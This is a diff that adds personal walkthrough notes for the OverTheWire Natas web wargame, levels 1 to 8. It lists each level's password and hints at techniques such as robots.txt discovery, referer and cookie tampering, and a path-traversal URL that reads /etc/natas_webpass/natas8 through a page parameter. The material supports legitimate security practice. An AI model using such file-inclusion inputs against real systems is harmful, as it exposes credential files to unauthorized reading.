@@ -15,6 +15,7 @@ inspect:  /html/body/div[1]
 
 Level 1 -> Level 2:
 Username: natas3
+Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
 URL:      http://natas3.natas.labs.overthewire.org
 
 (I made a shortcut to the inspector tool)
@@ -62,8 +63,62 @@ https://blog.certcube.com/overthewire-natas/
 
 Level 3 -> Level 4:
 Username: natas4
-Password:
+Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
 URL:      http://natas4.natas.labs.overthewire.org
 
+http://natas3.natas.labs.overthewire.org/robots.txt
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm 
 
-https://natas4.natas.labs.overthewire.org
+Resources Used: A bunch of sketchy websites that said to use robots.txt
+
+
+Level 4 -> Level 5:
+username: natas5
+password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+url: http://natas5.natas.labs.overthewire.org/
+
+I downloaded a referral editor. 
+
+Resources used:
+https://mcpa.github.io/natas/wargame/web/overthewire/2015/09/28/natas04/
+
+Level 5 -> Level 6:
+username: natas6
+password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+url: http://natas6.natas.labs.overthewire.org/
+
+
+Change the cookie and login. :) 
+
+Level 6 -> Level 7:
+password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+Go to
+http://natas6.natas.labs.overthewire.org/includes/secret.inc 
+
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+Level 7 -> Level 8:
+Password:
+a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+Go to:
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+In the comments I saw: 
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+This is wacky
+http://natas7.natas.labs.overthewire.org/index.php/etc/natas_webpass/index.php?page=etc
+
+Warning: include(etc): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
+
+Warning: include(): Failed opening 'etc' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
+
+Resources used:
+https://mcpa.github.io/natas/wargame/web/overthewire/2015/09/28/natas07/
+--> I had an extra slash
